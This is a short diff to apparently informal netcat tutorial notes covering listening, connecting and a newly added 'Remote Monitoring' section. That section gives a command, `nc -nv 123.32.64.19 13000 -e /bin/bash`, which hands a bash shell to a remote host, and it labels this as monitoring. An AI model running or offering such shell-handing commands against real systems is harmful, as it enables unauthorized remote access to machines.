@@ -20,6 +20,10 @@ command : $ nc -vl 13000
 on clinet side:
 connect to the remote using its ip adn common port both
 
-command: $ nc  -nv 10.11.15.20 13000
+command: $ nc  -nv 123.32.64.19 13000
 
+3. Remote Monitoring
 
+For this you just need to provide the shell information using option -e.
+ex:
+command : $nc -nv 123.32.64.19 13000 -e /bin/bash   /* your shell name*/
